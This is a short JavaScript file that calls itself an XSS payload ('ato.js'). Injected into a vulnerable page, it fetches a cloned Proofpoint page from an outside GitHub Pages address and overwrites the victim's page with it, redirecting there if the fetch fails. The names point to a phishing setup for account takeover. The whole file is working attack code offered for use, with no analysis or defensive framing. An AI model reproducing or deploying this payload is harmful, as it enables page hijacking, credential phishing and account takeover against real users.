// ato.js - XSS Payload that fetches and replaces the page with your clone
(function() {
    // Prevent multiple executions
    if (window.atoExecuted) return;
    window.atoExecuted = true;
    
    // Fetch your full Proofpoint clone from GitHub Pages
    fetch('https://swathip888a.github.io/ATO/index.html')
        .then(response => response.text())
        .then(html => {
            // Replace the entire page with your clone
            document.open();
            document.write(html);
            document.close();
        })
        .catch(error => {
            // Fallback: direct redirect if fetch fails
            console.error('ATO Load Error:', error);
            window.location.href = 'https://swathip888a.github.io/ATO/index.html';
        });
})();
